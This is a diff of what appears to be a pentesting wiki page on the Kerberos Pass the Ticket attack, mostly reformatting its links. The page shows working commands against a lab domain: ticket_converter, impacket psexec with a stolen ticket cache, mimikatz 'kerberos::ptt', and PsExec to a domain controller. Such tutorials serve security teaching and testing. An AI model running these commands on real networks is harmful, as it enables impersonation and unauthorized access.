@@ -1,18 +1,17 @@
 # Pass the Ticket
 
-
 ## Pass The Ticket (PTT)
 
 In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.
 
 **Read**:
 
-- [[../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md|Harvesting tickets from Windows]]
-- [[../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md|Harvesting tickets from Linux]]
+- [Harvesting tickets from Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
+- [Harvesting tickets from Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
 
 ### **Swaping Linux and Windows tickets between platforms**
 
-The [[https://github.com/Zer1t0/ticket_converter|**ticket_converter**]] tool converts ticket formats using just the ticket itself and an output file.
+The [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) tool converts ticket formats using just the ticket itself and an output file.
 
 ```bash
 python ticket_converter.py velociraptor.ccache velociraptor.kirbi
@@ -21,8 +20,8 @@ Converting ccache => kirbi
 python ticket_converter.py velociraptor.kirbi velociraptor.ccache
 Converting kirbi => ccache
 ```
-```
-In Windows [[https://github.com/gentilkiwi/kekeo|Kekeo]] can be used.
+
+In Windows [Kekeo](https://github.com/gentilkiwi/kekeo) can be used.
 
 ### Pass The Ticket Attack
 
@@ -30,7 +29,7 @@ In Windows [[https://github.com/gentilkiwi/kekeo|Kekeo]] can be used.
 export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
 python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
 ```
-```
+
 ```bash:Windows
 #Load the ticket in memory using mimikatz or Rubeus
 mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
@@ -38,10 +37,8 @@ mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.k
 klist #List tickets in cache to cehck that mimikatz has loaded the ticket
 .\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
 ```
-```
+
 ## References
 
-- [[https://www.tarlogic.com/blog/how-to-attack-kerberos/|https://www.tarlogic.com/blog/how-to-attack-kerberos/]]
-
-
+- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 
